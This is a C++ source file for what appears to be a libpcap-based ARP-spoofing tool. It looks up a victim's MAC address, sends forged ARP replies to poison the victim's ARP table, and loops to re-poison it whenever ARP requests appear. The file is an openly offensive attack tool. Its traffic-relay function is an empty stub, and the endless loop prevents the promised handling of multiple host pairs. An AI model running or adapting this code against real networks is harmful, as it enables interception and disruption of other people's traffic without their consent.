#include "main.h"
#include <thread>

void relayIpPacket() {

}



int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc - 1; iter += 2)
	{
		char *dev = argv[1];
		const char *interfaceName = argv[1];

		// Collect host info for ARP packet
		unsigned char att_mac[6];
		char att_ip[INET_ADDRSTRLEN];
		getHostInfo(argv[1], att_mac, att_ip);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// Send ARP Request packet for dst_mac(victim MAC address)
		char send_mac[ETH_ALEN];
		char *send_ip = argv[iter];
		char *tar_ip = argv[iter + 1];

		getSenderMac(handle, Mac(att_mac), Ip(att_ip), send_mac, Ip(send_ip));

		printf("sender MAC : %s\n", send_mac);
		printf("sender IP : %s\n", send_ip);

		// Send ARP Reply packet to infect victim(sender)'s ARP table
		sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));

		// Reinfection
		// Case #1 : sender broadcasts arp request packet (to get gateway's mac)
		// Case #2 : gateway broadcasts arp request packet (to get sender's mac)
		// Case #3 : gateway broadcasts arp request (to get david(other one)'s mac)
		while (true)
		{
			if (reinfect(handle, send_ip, tar_ip) == 1)
			{
				sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
			}
			// relayIpPacket(handle, send_ip, send_mac, tar_ip, att_mac);
			// std::thread t1(relayIpPacket, );
			// relayIpPacket(handle, send_ip, send_mac, att_ip, att_mac);
			// t1.join();
		}

		pcap_close(handle);
	}
}
